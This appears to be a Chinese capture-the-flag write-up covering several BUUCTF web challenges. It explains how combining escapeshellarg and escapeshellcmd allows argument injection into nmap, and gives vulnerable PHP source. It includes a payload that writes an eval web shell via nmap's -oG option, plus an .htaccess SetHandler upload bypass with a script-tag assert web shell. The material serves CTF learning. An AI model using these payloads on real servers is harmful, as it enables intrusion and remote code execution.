[TOC]

## 0x20.[BUUCTF 2018]Online Tool

escapeshellarg与escapeshellcmd函数公用漏洞。

相关文章：[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)

>   1.  传入的参数是：172.17.0.2' -v -d a=1
>   2.  经过escapeshellarg处理后变成了'172.17.0.2'\\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
>   3.  经过escapeshellcmd处理后变成'172.17.0.2'\\\\'' -v -d a=1\\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
>   4.  最后执行的命令是curl '172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。

题目源码：

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

nmap中够一个-oG的参数可以实现命令和结果写入到文件。

payload：

```
?host='<?php @eval($_post['cmd'])?;> -oG 123.php'
```

然后蚁剑连接就OK

## 0x21.[GXYCTF2019]BabyUpload

考点就是上传。

 文件名后缀不能是 ph 开头，文件内容过滤<?

上传.hatcess

>   ```
>   SetHandler application/x-httpd-php
>   ```

然后上传1.jpg

普通的一句话会被过滤，可能过滤了<?

>   <script language='php'>assert($_REQUEST['cmd'])</script>

## 0x22.[RoarCTF 2019]Easy Java(没做)



## 0x23.[强网杯 2019]高明的黑客



